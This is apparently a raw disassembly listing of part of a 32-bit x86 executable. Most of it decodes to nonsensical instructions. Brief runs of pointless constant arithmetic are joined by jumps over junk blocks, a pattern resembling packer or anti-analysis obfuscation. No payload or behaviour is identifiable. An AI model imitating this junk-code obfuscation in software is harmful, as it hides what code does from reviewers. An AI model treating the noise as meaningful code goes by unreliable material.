  40c7d3:	pop    eax
  40c7d4:	push   ebx
  40c7d5:	and    BYTE PTR [ecx+edx*4],bh
  40c7d8:	xor    edi,DWORD PTR [ecx+0xe]
  40c7db:	arpl   WORD PTR [esi+0x32cf8a7e],dx
  40c7e1:	lods   eax,DWORD PTR ds:[esi]
  40c7e2:	ins    BYTE PTR es:[edi],dx
  40c7e3:	rcl    DWORD PTR [ebx-0x4d48bb4c],0x28
  40c7ea:	retf   
  40c7eb:	inc    eax
  40c7ec:	fwait
  40c7ed:	lahf   
  40c7ee:	fcmovbe st,st(4)
  40c7f0:	jno    0x40c86f
  40c7f2:	aas    
  40c7f3:	or     ah,bh
  40c7f5:	inc    ecx
  40c7f6:	in     eax,dx
  40c7f7:	mov    cl,0xc8
  40c7f9:	add    eax,0xcd7447d1
  40c7fe:	mov    esi,0x32818471
  40c803:	popf   
  40c804:	inc    edi
  40c805:	cmp    BYTE PTR ds:0xa71d027e,bl
  40c80b:	test   al,0xb0
  40c80d:	fistp  DWORD PTR [ebx+edi*4]
  40c810:	cmp    esi,DWORD PTR [eax]
  40c812:	ss mov ebp,0xe0cf06dd
  40c818:	je     0x40c864
  40c81a:	cmp    BYTE PTR [ebx-0x5891492a],bl
  40c820:	xor    esp,eax
  40c822:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c823:	jae    0x40c7f4
  40c825:	stos   DWORD PTR es:[edi],eax
  40c826:	jae    0x40c80b
  40c828:	imul   ecx,DWORD PTR [edx+0x73],0xffffffe7
  40c82c:	mov    bh,0x64
  40c82e:	pop    ebx
  40c82f:	mov    ds:0xa6c57530,al
  40c834:	outs   dx,BYTE PTR ds:[esi]
  40c835:	mov    DWORD PTR ds:0x890853ea,esp
  40c83b:	jp     0x40c838
  40c83d:	mov    eax,0x712265fe
  40c842:	sbb    BYTE PTR [edx],0xe2
  40c845:	pop    ebp
  40c846:	jmp    0xc64898ac
  40c84b:	ins    DWORD PTR es:[edi],dx
  40c84c:	dec    esi
  40c84d:	add    BYTE PTR [ebx],ah
  40c84f:	clc    
  40c850:	mov    BYTE PTR [edi],al
  40c852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c853:	pop    edi
  40c854:	inc    ecx
  40c855:	sbb    eax,0x79cb30b4
  40c85a:	lahf   
  40c85b:	int3   
  40c85c:	mov    ecx,0x75a49d29
  40c861:	add    eax,0x926989c5
  40c866:	mov    eax,DWORD PTR [ecx]
  40c868:	imul   edi,DWORD PTR [ecx-0x2f25d8a9],0xffffffd9
  40c86f:	ds gs scas eax,DWORD PTR es:[edi]
  40c872:	stc    
  40c873:	sub    al,0xe2
  40c875:	dec    ebp
  40c876:	dec    esp
  40c877:	mov    ds:0x9748931a,al
  40c87c:	inc    edi
  40c87d:	inc    eax
  40c87e:	inc    esi
  40c87f:	push   0x4a
  40c881:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c882:	std    
  40c883:	lods   eax,DWORD PTR ds:[esi]
  40c884:	inc    edi
  40c885:	hlt    
  40c886:	xor    ecx,DWORD PTR [ecx+0x21]
  40c889:	dec    esp
  40c88a:	push   esp
  40c88b:	xchg   edi,eax
  40c88c:	cli    
  40c88d:	das    
  40c88e:	and    DWORD PTR [edi+0x2e],ebx
  40c891:	fnstenv [eax-0x5f]
  40c894:	sbb    DWORD PTR [edi+0x5e3ebe41],0xffffff9d
  40c89b:	lock xchg edx,eax
  40c89d:	(bad)  
  40c89e:	lahf   
  40c89f:	rcl    BYTE PTR [ecx+0x4340d7f9],0xcc
  40c8a6:	retf   0x8eba
  40c8a9:	sbb    DWORD PTR [ebx+eiz*2+0xc488593],edi
  40c8b0:	das    
  40c8b1:	mov    al,ds:0x789f0537
  40c8b6:	push   eax
  40c8b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8b8:	(bad)  
  40c8ba:	adc    eax,0xc290c06b
  40c8bf:	js     0x40c87d
  40c8c1:	sub    DWORD PTR [edx+0x1c],ebp
  40c8c4:	fsub   QWORD PTR [esi-0x190adf86]
  40c8ca:	sar    DWORD PTR [eax-0x3ce53bc7],1
  40c8d0:	std    
  40c8d1:	xor    BYTE PTR [eax],bh
  40c8d3:	mov    edx,0xc45da3fb
  40c8d8:	mov    al,ds:0x84091ef7
  40c8dd:	jne    0x40c90c
  40c8df:	scas   eax,DWORD PTR es:[edi]
  40c8e0:	fst    QWORD PTR [edi-0x31]
  40c8e3:	mov    bh,0xa5
  40c8e5:	lods   eax,DWORD PTR ds:[esi]
  40c8e6:	aad    0x10
  40c8e8:	jne    0x40c943
  40c8ea:	mov    dh,0x11
  40c8ec:	aas    
  40c8ed:	mov    cs,eax
  40c8ef:	push   ecx
  40c8f0:	and    ecx,DWORD PTR [esi]
  40c8f2:	out    dx,eax
  40c8f3:	lods   eax,DWORD PTR ds:[esi]
  40c8f4:	pop    ss
  40c8f5:	push   0xaf9f86dd
  40c8fa:	into   
  40c8fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8fc:	mov    bh,0x93
  40c8fe:	in     al,dx
  40c8ff:	adc    eax,0x73614db7
  40c904:	jne    0x40c88e
  40c906:	sti    
  40c907:	retf   
  40c908:	loopne 0x40c941
  40c90a:	add    eax,DWORD PTR [eax-0x6982c0cb]
  40c910:	mov    al,ds:0xdc09ca1a
  40c915:	int    0x1d
  40c917:	test   DWORD PTR [ecx],edi
  40c919:	xchg   esp,eax
  40c91a:	pop    ebp
  40c91b:	xor    ebx,DWORD PTR [eax+0x499b9a49]
  40c921:	lods   eax,DWORD PTR ds:[esi]
  40c922:	add    al,0xc2
  40c924:	ds es leave 
  40c927:	sti    
  40c928:	aaa    
  40c929:	js     0x40c8b8
  40c92b:	ret    
  40c92c:	cs sahf 
  40c92e:	push   0x4400dddc
  40c933:	sub    al,0x3
  40c935:	cmp    ebx,0xffffff83
  40c938:	cld    
  40c939:	mov    ah,0xf4
  40c93b:	jo     0x40c909
  40c93d:	mov    eax,ds:0xaf9d7e8c
  40c942:	or     eax,eax
  40c944:	mov    DWORD PTR [eax+0x4b],ecx
  40c947:	mov    cl,0xb1
  40c949:	stc    
  40c94a:	dec    esp
  40c94b:	sbb    al,0x3e
  40c94d:	or     bh,BYTE PTR [ebx+ebx*2+0x3d]
  40c951:	mov    edx,0x8cf1710c
  40c956:	fwait
  40c957:	pop    ds
  40c958:	add    eax,0x890323a7
  40c95d:	sbb    al,0xfe
  40c95f:	adc    DWORD PTR [ecx],ecx
  40c961:	loope  0x40c9a3
  40c963:	(bad)  
  40c965:	aas    
  40c966:	and    BYTE PTR [eax+0x2322cfb2],bl
  40c96c:	xchg   edx,eax
  40c96d:	dec    ebp
  40c96e:	push   esi
  40c96f:	paddusb mm3,mm0
  40c972:	leave  
  40c973:	stos   DWORD PTR es:[edi],eax
  40c974:	adc    eax,0xabe3e99b
  40c979:	and    al,BYTE PTR [ebx+0x67]
  40c97c:	sbb    al,0x8e
  40c97e:	fwait
  40c97f:	pop    ss
  40c980:	pop    esi
  40c981:	nop
  40c982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c983:	dec    eax
  40c984:	mov    al,0x98
  40c986:	dec    ecx
  40c987:	sub    eax,0x146565da
  40c98c:	pop    es
  40c98d:	jl     0x40c94c
  40c98f:	sub    DWORD PTR [edi],edi
  40c991:	inc    esi
  40c992:	ror    DWORD PTR [ebx-0x3f207ab],1
  40c998:	aaa    
  40c999:	add    BYTE PTR [eax],al
  40c99b:	add    eax,0xffffc003
  40c9a0:	xor    ecx,0x734d
  40c9a6:	and    ecx,edx
  40c9a8:	mov    edx,DWORD PTR ds:0x4225e8
  40c9ae:	xor    ecx,edx
  40c9b0:	mov    DWORD PTR [esi+ecx*4-0x2818],eax
  40c9b7:	mov    DWORD PTR [ebp-0x4],0x2194
  40c9be:	mov    DWORD PTR [ebp-0x8],0x4a39
  40c9c5:	mov    eax,DWORD PTR [ebp-0x8]
  40c9c8:	mov    ecx,DWORD PTR ds:0x4225ec
  40c9ce:	add    eax,0x1f68
  40c9d3:	imul   eax,ecx
  40c9d6:	mov    ecx,DWORD PTR [ebp-0x4]
  40c9d9:	imul   eax,eax,0x6ca1
  40c9df:	xor    ecx,eax
  40c9e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c9e4:	mov    DWORD PTR [esi+ecx*4+0x4e066214],eax
  40c9eb:	mov    ecx,DWORD PTR ds:0x4225f0
  40c9f1:	xor    edx,edx
  40c9f3:	mov    eax,0x6c24
  40c9f8:	div    ecx
  40c9fa:	push   0x3
  40c9fc:	xor    edx,edx
  40c9fe:	pop    ecx
  40c9ff:	sub    eax,0x30e8
  40ca04:	xor    eax,0x3f11
  40ca09:	div    ecx
  40ca0b:	mov    ecx,0x136c
  40ca10:	sub    ecx,eax
  40ca12:	mov    eax,DWORD PTR [ebp+0xc]
  40ca15:	mov    DWORD PTR [esi+ecx*4],eax
  40ca18:	mov    DWORD PTR [ebp+0xc],0x1998
  40ca1f:	mov    DWORD PTR [ebp+0x8],0x5114
  40ca26:	mov    eax,ds:0x4225f4
  40ca2b:	mov    ecx,DWORD PTR [ebp+0x8]
  40ca2e:	imul   eax,ecx
  40ca31:	mov    ecx,DWORD PTR [ebp+0xc]
  40ca34:	imul   eax,eax,0x6079
  40ca3a:	and    ecx,eax
  40ca3c:	mov    eax,DWORD PTR [ebp+0x10]
  40ca3f:	mov    DWORD PTR [esi+ecx*4-0x50],eax
  40ca43:	mov    DWORD PTR [ebp+0x8],0x58
  40ca4a:	mov    eax,DWORD PTR [ebp+0x8]
  40ca4d:	sub    eax,0x183a
  40ca52:	or     eax,0x339e
  40ca57:	xor    eax,0xfffffb9f
  40ca5c:	pop    edi
  40ca5d:	leave  
  40ca5e:	ret    0xc
  40ca61:	push   ebp
  40ca62:	mov    ebp,esp
  40ca64:	sub    esp,0x40
  40ca67:	jmp    0x40ce22
  40ca6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca6d:	sub    ebx,DWORD PTR [esi]
  40ca6f:	clc    
  40ca70:	mov    ch,0xfd
  40ca72:	mov    esp,0x6d4ed4b7
  40ca77:	inc    ebp
  40ca78:	fdivr  QWORD PTR [esi-0x59]
  40ca7b:	outs   dx,DWORD PTR ds:[esi]
  40ca7c:	arpl   si,cx
  40ca7e:	mov    ebx,0xbbc5efbb
  40ca83:	mov    ebx,0x597ddfe0
  40ca88:	sbb    esp,edx
  40ca8a:	dec    ebx
  40ca8b:	aas    
  40ca8c:	jg     0x40cab3
  40ca8e:	jae    0x40ca96
  40ca90:	sub    ecx,DWORD PTR [edi-0x9]
  40ca93:	pop    ecx
  40ca94:	scas   eax,DWORD PTR es:[edi]
  40ca95:	mov    dl,0x78
  40ca97:	mov    bl,0xc1
  40ca99:	out    dx,eax
  40ca9a:	int3   
  40ca9b:	mov    eax,ds:0x84dd2548
  40caa0:	(bad)  
  40caa1:	pop    edx
  40caa2:	rcr    BYTE PTR [edx+0x1bad53ab],1
  40caa8:	jb     0x40cacf
  40caaa:	xchg   DWORD PTR [esi-0x42033901],esi
  40cab0:	push   esi
  40cab1:	jmp    0x40ca9c
  40cab3:	rol    BYTE PTR [ebx+eax*4+0x4303e8bf],cl
  40caba:	adc    al,BYTE PTR [edi]
  40cabc:	mov    eax,ds:0x111c0d22
  40cac1:	cmp    al,0xd3
  40cac3:	add    BYTE PTR [ecx-0x57cedf8f],cl
  40cac9:	adc    DWORD PTR [edx],0x8
  40cacc:	sub    DWORD PTR [eax],0x9da84b21
  40cad2:	enter  0x990c,0xfd
  40cad6:	cmp    DWORD PTR [esp+eiz*8+0x7436a8ab],esp
  40cadd:	sbb    esi,DWORD PTR [ebx+0x3a]
  40cae0:	icebp  
  40cae1:	loope  0x40ca74
  40cae3:	test   BYTE PTR [esi+0x50],dl
  40cae6:	xchg   DWORD PTR [ebp+0x7d348c8b],ecx
  40caec:	call   0xc379f8a0
  40caf1:	jle    0x40ca82
  40caf3:	cmp    edi,eax
  40caf5:	jge    0x40ca8d
  40caf7:	push   ebp
  40caf8:	push   ebp
  40caf9:	xchg   ebx,eax
  40cafa:	or     DWORD PTR ss:[ebp-0x53],edx
  40cafe:	es call 0xa360:0x7455c173
  40cb06:	jbe    0x40caa9
  40cb08:	sub    bl,BYTE PTR [esi+0x3a]
  40cb0b:	and    eax,esp
  40cb0d:	mov    eax,0x994a0b6b
  40cb12:	(bad)  
  40cb13:	int3   
  40cb14:	inc    ecx
  40cb15:	push   edi
  40cb16:	mov    ah,0xea
  40cb18:	xor    bl,BYTE PTR [eax]
  40cb1a:	inc    ebp
  40cb1b:	sbb    ebp,DWORD PTR [ebx]
  40cb1d:	jne    0x40cae9
  40cb1f:	fisub  DWORD PTR ds:0x11f3e6fa
  40cb26:	or     al,0xa0
  40cb28:	loop   0x40caae
  40cb2a:	repnz fsubr DWORD PTR [eax]
  40cb2d:	(bad)  
  40cb2e:	scas   al,BYTE PTR es:[edi]
  40cb2f:	xor    BYTE PTR [edi-0x300cb7ee],0x10
  40cb36:	adc    esi,DWORD PTR [edx-0x3f]
  40cb39:	mov    cr6,edx
  40cb3c:	fstp   TBYTE PTR cs:[eax+eax*4-0x7e]
  40cb41:	cli    
  40cb42:	and    al,0x58
  40cb44:	push   ds
  40cb45:	mov    dh,0xe4
  40cb47:	jmp    0x73f9e4d4
  40cb4c:	jge    0x40cb43
  40cb4e:	jbe    0x40cb44
  40cb50:	sub    eax,0xdb66bff4
  40cb55:	data16 arpl bx,bx
  40cb58:	adc    DWORD PTR [edi-0x4974e047],0xffffffd5
  40cb5f:	ds inc ebx
  40cb61:	jmp    0xeef76348
  40cb66:	jmp    0x40cb3d
  40cb68:	ret    0x9c84
  40cb6b:	out    dx,al
  40cb6c:	xchg   esi,eax
  40cb6d:	shr    BYTE PTR [ebp-0x64fd97e1],1
  40cb73:	mov    edx,0x87a9ab7f
  40cb78:	shl    BYTE PTR [edi+0x4dd5ccce],0xc1
  40cb7f:	int    0xd
  40cb81:	je     0x40cb4a
  40cb83:	cwde   
  40cb84:	cmp    ebp,DWORD PTR [ebp-0x3f16926]
  40cb8a:	enter  0x2cab,0xd1
  40cb8e:	out    0x4f,eax
  40cb90:	push   ss
  40cb91:	adc    al,0xeb
  40cb93:	mov    BYTE PTR [ebp+0x2e3820cb],al
  40cb99:	sbb    al,0x37
  40cb9b:	mov    ah,0x92
  40cb9d:	mov    ebp,DWORD PTR [ebp+0x756b71c8]
  40cba3:	xchg   esi,eax
  40cba4:	ins    DWORD PTR es:[edi],dx
  40cba5:	popf   
  40cba6:	cs push edi
  40cba8:	ret    
  40cba9:	cmp    DWORD PTR [edi+eiz*2],ebx
  40cbac:	adc    bl,bl
  40cbae:	pop    eax
  40cbaf:	dec    ecx
  40cbb0:	add    eax,0xe54b158
  40cbb5:	es popf 
  40cbb7:	mov    bl,0x71
  40cbb9:	loope  0x40cba5
  40cbbb:	push   eax
  40cbbc:	rcr    cl,1
  40cbbe:	push   ecx
  40cbbf:	add    DWORD PTR [esi],ebp
  40cbc1:	mov    eax,ss
  40cbc3:	in     eax,0xab
  40cbc5:	or     DWORD PTR [edx+0x7e1c5836],ebx
  40cbcb:	mov    eax,ds:0x75adeaba
  40cbd0:	lahf   
  40cbd1:	and    DWORD PTR [esi+0x7af3bc2b],edx
  40cbd7:	retf   0xa99c
  40cbda:	cmp    BYTE PTR [eax],bl
  40cbdc:	dec    esi
  40cbdd:	test   edx,0xed343221
  40cbe3:	sub    dl,bl
  40cbe5:	mov    esp,0x5828a49d
  40cbea:	pop    edx
  40cbeb:	mov    ecx,0x5d1865f4
  40cbf0:	inc    eax
  40cbf1:	idiv   cl
  40cbf3:	stos   BYTE PTR es:[edi],al
  40cbf4:	(bad)
  40cbf7:	sti    
  40cbf8:	addr16 fneni(8087 only) 
  40cbfb:	mov    dh,0xe7
  40cbfd:	ins    BYTE PTR es:[edi],dx
  40cbfe:	mov    BYTE PTR [ecx],bh
  40cc00:	je     0x40cc66
  40cc02:	fwait
  40cc03:	ret    
  40cc04:	lods   eax,DWORD PTR ds:[esi]
  40cc05:	ds pop edi
  40cc07:	mov    eax,0x98f7fbc6
  40cc0c:	mov    bh,0x62
  40cc0e:	add    edx,DWORD PTR [edi+0x58f20a6]
  40cc14:	cld    
  40cc15:	mov    bl,0x44
  40cc17:	push   0xebaec2b2
  40cc1c:	popa   
  40cc1d:	fsub   DWORD PTR [esi+0x9]
  40cc20:	push   ds
  40cc21:	add    esp,ebp
  40cc23:	pop    ebx
  40cc24:	sub    bh,BYTE PTR [ebp-0x1ab73ef2]
  40cc2a:	mov    esi,0xb9c6c6c8
  40cc2f:	lahf   
  40cc30:	cmp    al,0x78
  40cc32:	pop    ebp
  40cc33:	xchg   BYTE PTR ds:[eax+0x39],al
  40cc37:	int3   
  40cc38:	and    esp,DWORD PTR [ecx]
  40cc3a:	xchg   ebp,eax
  40cc3b:	mov    ebx,0x951ae8ff
  40cc40:	push   ebp
  40cc41:	jo     0x40cc2e
  40cc43:	inc    esi
  40cc44:	ss loopne 0x40cbc8
  40cc47:	cmc    
  40cc48:	mov    bl,0xd3
  40cc4a:	mov    bh,0x4c
  40cc4c:	imul   eax,edx,0xcdce8061
  40cc52:	mov    eax,0xfa37ca10
  40cc57:	jnp    0x40cc8d
  40cc59:	fs dec ebx
  40cc5b:	xchg   DWORD PTR [ebx+0x67],edi
  40cc5e:	je     0x40cc19
  40cc60:	int    0x2e
  40cc62:	jg     0x40cbe8
  40cc64:	fisub  WORD PTR [ebp-0x29c3bb8e]
  40cc6a:	cmp    BYTE PTR [ebx-0x1e9347cd],0x35
  40cc71:	scas   eax,DWORD PTR es:[edi]
  40cc72:	push   edx
  40cc73:	scas   al,BYTE PTR es:[edi]
  40cc74:	xchg   edx,eax
  40cc75:	shl    BYTE PTR [ebx+esi*2+0x58],1
  40cc79:	sub    ebx,DWORD PTR [eax]
  40cc7b:	iret   
  40cc7c:	jnp    0x40cc12
  40cc7e:	je     0x40ccf6
  40cc80:	push   ss
  40cc81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc82:	aas    
  40cc83:	jnp    0x40cced
  40cc85:	adc    DWORD PTR [eax+edx*2-0x70],edi
  40cc89:	dec    ebp
  40cc8a:	retf   0xabe
  40cc8d:	lea    esi,[edi+0x35]
  40cc90:	xor    eax,0x44f541f4
  40cc95:	or     ebp,esp
  40cc97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc99:	scas   eax,DWORD PTR es:[edi]
  40cc9a:	rcl    BYTE PTR [ebx-0x786750a5],cl
  40cca0:	sbb    ebp,DWORD PTR [ebp-0x74]
  40cca3:	(bad)  
  40cca4:	rcr    BYTE PTR [edx],cl
  40cca6:	or     dl,al
  40cca8:	fld    DWORD PTR [eax+eiz*2+0x0]
  40ccac:	inc    ebx
  40ccad:	push   0xab7354e2
  40ccb2:	inc    eax
  40ccb3:	scas   eax,DWORD PTR es:[edi]
  40ccb4:	std    
  40ccb5:	mov    ds:0xb511f434,al
  40ccba:	test   ah,dl
  40ccbc:	push   ebp
  40ccbd:	xchg   ebp,eax
  40ccbe:	jo     0x40cc97
  40ccc0:	leave  
  40ccc1:	adc    bh,BYTE PTR [esi+0x6c11a42b]
  40ccc7:	mov    ds:0x5887b419,al
  40cccc:	add    DWORD PTR cs:[ebp+0x3adb6136],esp
  40ccd3:	dec    esp
  40ccd4:	pop    edi
  40ccd5:	mov    ecx,0xfa5eef95
  40ccda:	es pop esi
  40ccdc:	shr    DWORD PTR [ecx-0x5e],1
  40ccdf:	into   
  40cce0:	add    DWORD PTR [edx+0x4352857b],esp
  40cce6:	jmp    0x95fc9fae
  40cceb:	jne    0x40cd68
  40cced:	sub    ebp,DWORD PTR [ebx-0x4965a5c1]
  40ccf3:	mov    al,ds:0xe12d0337
  40ccf8:	add    eax,0xb251283b
  40ccfd:	jmp    0x51e693b
  40cd02:	pop    esp
  40cd03:	sub    BYTE PTR [eax],dl
  40cd05:	je     0x40cc88
  40cd07:	popf   
  40cd08:	ss mov ch,0xfe
  40cd0b:	test   al,0x43
  40cd0d:	int    0x9e
  40cd0f:	int3   
  40cd10:	add    eax,0x882d0b3
  40cd15:	mov    al,ds:0x484a1a8e
  40cd1a:	add    al,0x1
  40cd1c:	sub    ebp,DWORD PTR [esi-0x40]
  40cd1f:	add    al,dl
  40cd21:	mov    WORD PTR [edi+eax*2],ds
  40cd24:	and    al,0x78
  40cd26:	jbe    0x40cd12
  40cd28:	mov    dl,0xd2
  40cd2a:	xchg   DWORD PTR [edx+0x1b483a6d],edi
  40cd30:	out    dx,al
  40cd31:	sbb    al,0x1a
  40cd33:	(bad)  
  40cd34:	(bad)  
  40cd35:	mov    ebx,0xfad16088
  40cd3a:	sub    BYTE PTR [esi+0x50],dl
  40cd3d:	ret    0xc035
  40cd40:	adc    dl,BYTE PTR [ebx-0x26]
  40cd43:	ja     0x40cce4
  40cd45:	retf   0x2cda
  40cd48:	addr16 push 0xffffffd4
  40cd4b:	push   edx
  40cd4c:	retf   
  40cd4d:	inc    esp
  40cd4e:	jmp    0x7679:0xde59bab5
  40cd55:	sub    bh,BYTE PTR ds:0x116d7626
  40cd5b:	ret    0x73ef
  40cd5e:	push   esi
  40cd5f:	fisttp QWORD PTR [ecx+0x2a]
  40cd62:	pop    ecx
  40cd63:	ins    DWORD PTR es:[edi],dx
  40cd64:	or     BYTE PTR [edi],0x12
  40cd67:	into   
  40cd68:	mov    ecx,0xeb1d190a
  40cd6d:	xor    ah,BYTE PTR [ebp-0x1bcfeee]
  40cd73:	xchg   esi,eax
  40cd74:	sbb    BYTE PTR [edi-0xd28a867],cl
  40cd7a:	daa    
  40cd7b:	rcl    DWORD PTR [esp+edx*1],1
  40cd7e:	inc    eax
  40cd7f:	cmp    eax,DWORD PTR [ebp+0x1e]
  40cd82:	jno    0x40cdbb
  40cd84:	inc    ebp
  40cd85:	inc    edx
  40cd86:	jo     0x40cd72
  40cd88:	retf   0x1067
  40cd8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd8c:	push   es
  40cd8d:	add    esi,DWORD PTR [edi-0x350ea74e]
  40cd93:	mov    ecx,0x22431b25
  40cd98:	bound  ebx,QWORD PTR [ecx+ebx*2]
  40cd9b:	mov    esi,0x19efb5f8
  40cda0:	les    ecx,FWORD PTR [edi+0x6992f1c6]
  40cda6:	je     0x40ce04
  40cda8:	adc    al,0x62
  40cdaa:	mov    esi,0x142f0b9f
  40cdaf:	pop    es
  40cdb0:	out    0x68,eax
  40cdb2:	outs   dx,DWORD PTR ds:[esi]
  40cdb3:	sub    DWORD PTR [esi-0x9],ebx
  40cdb6:	popa   
  40cdb7:	dec    ebx
  40cdb8:	mov    esi,0xee2f1fba
  40cdbd:	inc    edx
  40cdbe:	dec    edi
  40cdbf:	mov    eax,ds:0x6753ac99
  40cdc4:	mov    BYTE PTR [esi-0x3b],cl
  40cdc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdc8:	cmp    ebx,DWORD PTR [eax]
  40cdca:	outs   dx,BYTE PTR ds:[esi]
  40cdcb:	jbe    0x40cdb8
  40cdcd:	lds    edi,FWORD PTR [ebx-0x7b]
  40cdd0:	pop    ebx
  40cdd1:	mov    ah,0x5a
  40cdd3:	pop    ds
  40cdd4:	xor    bl,ch
  40cdd6:	pop    es
  40cdd7:	int    0x24
  40cdd9:	sbb    BYTE PTR [eax-0x26],bl
  40cddc:	daa    
  40cddd:	pop    ebp
  40cdde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cddf:	mov    ecx,0x340b601f
  40cde4:	adc    ebx,DWORD PTR [ebp-0x8]
  40cde7:	popa   
  40cde8:	(bad)  
  40cde9:	push   edx
  40cdea:	stc    
  40cdeb:	inc    ebx
  40cdec:	and    eax,DWORD PTR [esp+ebx*4]
  40cdef:	es je  0x40cda0
  40cdf2:	sub    BYTE PTR [ebx-0x35],bh
  40cdf5:	jg     0x40ce60
  40cdf7:	mov    ecx,0x819724e8
  40cdfc:	xor    ebx,DWORD PTR [ebp-0x1ae9c501]
  40ce02:	add    eax,0x32b10b75
  40ce07:	sub    BYTE PTR [esi-0x3a],0xa
  40ce0b:	test   eax,0xf564f37a
  40ce10:	mov    ebx,0x6be76df4
  40ce15:	jg     0x40ce33
  40ce17:	addr16 pushf 
  40ce19:	sti    
  40ce1a:	jg     0x40ce2b
  40ce1c:	xor    edi,eax
  40ce1e:	rol    BYTE PTR [esp+edi*1],cl
  40ce21:	or     edx,DWORD PTR [esi+0x57]
  40ce24:	mov    esi,eax
  40ce26:	mov    DWORD PTR [ebp-0x38],0x6e80
  40ce2d:	mov    DWORD PTR [ebp-0x34],0xb4a
  40ce34:	mov    DWORD PTR [ebp-0x30],0xa247489c
  40ce3b:	mov    DWORD PTR [ebp-0x2c],0x14790
  40ce42:	mov    DWORD PTR [ebp-0x28],0x6813
  40ce49:	mov    DWORD PTR [ebp-0x24],0x620f
  40ce50:	mov    DWORD PTR [ebp-0x4],0x41a0
  40ce57:	mov    DWORD PTR [ebp-0x8],0x258a
  40ce5e:	mov    DWORD PTR [ebp-0xc],0x1
  40ce65:	mov    DWORD PTR [ebp-0x40],0x973
  40ce6c:	mov    DWORD PTR [ebp-0x3c],0x7e11
  40ce73:	jmp    0x40d22e
  40ce78:	jo     0x40cea9
  40ce7a:	test   al,0x26
  40ce7c:	lods   eax,DWORD PTR ds:[esi]
  40ce7d:	mov    ebp,0x6ca4bd74
  40ce82:	mov    DWORD PTR [edi],ebp
  40ce84:	add    eax,0x96050d4b
  40ce89:	(bad)  
  40ce8a:	mov    ebx,0xbbc5efbb
  40ce8f:	mov    ebx,0xaf12ffa
  40ce94:	test   BYTE PTR [ebx+0x195e36c2],bl
  40ce9a:	dec    ecx
  40ce9b:	icebp  
  40ce9c:	ds jp  0x40ce3f
  40ce9f:	cdq    
  40cea0:	pop    ebp
  40cea1:	int3   
  40cea2:	sub    ah,BYTE PTR [edx]
  40cea4:	out    0x61,al
  40cea6:	inc    ebp
  40cea7:	lods   eax,DWORD PTR ds:[esi]
  40cea8:	popa   
  40cea9:	adc    DWORD PTR [eax+0x76],0x9f81a426
  40ceb0:	jg     0x40ce42
  40ceb2:	(bad)  
  40ceb3:	fcom   QWORD PTR [eax+0x4b]
  40ceb6:	cmp    eax,0xd09fa2f3
  40cebb:	mov    bl,0x5b
  40cebd:	aad    0x97
  40cebf:	jge    0x40cf2b
  40cec1:	pop    ds
  40cec2:	jmp    0x7b14:0x80b5cb50
  40cec9:	mov    ch,0x5a
  40cecb:	or     DWORD PTR [ecx+ebx*1],ebp
  40cece:	rol    BYTE PTR [ebx+0x26],1
  40ced1:	aad    0x52
  40ced3:	pop    ebp
  40ced4:	mov    esp,0x8a7524af
  40ced9:	add    DWORD PTR [ebx+0x62e1e8ee],esi
  40cedf:	push   ds
  40cee0:	inc    esi
  40cee1:	add    al,0x92
  40cee3:	mov    eax,ds:0x784d69a2
  40cee8:	(bad)  
  40cee9:	ins    DWORD PTR es:[edi],dx
  40ceea:	dec    eax
  40ceeb:	mov    esp,DWORD PTR [esi+0x4441f854]
  40cef1:	cmp    esi,DWORD PTR [edx+0x16]
  40cef4:	mov    al,0xf2
  40cef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cef7:	pop    edi
  40cef8:	adc    BYTE PTR [ebx-0x7368116a],ch
  40cefe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceff:	and    BYTE PTR [esi+0x952cf2a],dl
  40cf05:	in     eax,dx
  40cf06:	daa    
  40cf07:	sbb    eax,0x85ee34d6
  40cf0c:	mov    ecx,ecx
  40cf0e:	sub    BYTE PTR [esi-0x4],cl
  40cf11:	popa   
  40cf12:	mov    edi,DWORD PTR [ebp+ebx*8-0x15]
  40cf16:	call   0x7a81:0xef5ac6ed
  40cf1d:	sbb    esi,DWORD PTR [eax+0x40f47586]
  40cf23:	ins    DWORD PTR es:[edi],dx
  40cf24:	int3   
  40cf25:	daa    
  40cf26:	pop    edx
  40cf27:	push   ecx
  40cf28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf29:	leave  
  40cf2a:	in     al,dx
  40cf2b:	sub    BYTE PTR [ecx+0x6a1641be],al
  40cf31:	popa   
  40cf32:	mov    eax,0xfa01be20
  40cf37:	iret   
  40cf38:	enter  0x24fb,0x83
  40cf3c:	add    esi,edi
  40cf3e:	frstor [esi-0x1a]
  40cf41:	or     DWORD PTR [ebp+0x65afe794],ecx
  40cf47:	enter  0x7f65,0xab
  40cf4b:	cli    
  40cf4c:	test   BYTE PTR [eax],0x6d
  40cf4f:	inc    esp
  40cf50:	jns    0x40cf28
  40cf52:	hlt    
  40cf53:	push   eax
  40cf54:	stos   BYTE PTR es:[edi],al
  40cf55:	xchg   edi,eax
  40cf56:	push   cs
  40cf57:	sub    DWORD PTR [ebx-0x51fb572d],ebx
  40cf5d:	ror    BYTE PTR [ebp-0x3990e95e],0xda
  40cf64:	add    DWORD PTR [edx],ecx
  40cf66:	aas    
  40cf67:	scas   eax,DWORD PTR es:[edi]
  40cf68:	or     al,BYTE PTR ds:[ebx]
  40cf6b:	mov    esp,0xfb24831
  40cf70:	xor    eax,0xeef577a6
  40cf75:	ret    
  40cf76:	in     al,0x1e
  40cf78:	adc    eax,0xa628eb05
  40cf7d:	dec    esi
  40cf7e:	shl    BYTE PTR [eax],cl
  40cf80:	push   ss
  40cf81:	pop    es
  40cf82:	mov    ds:0x34d51335,eax
  40cf87:	adc    DWORD PTR [eax],ecx
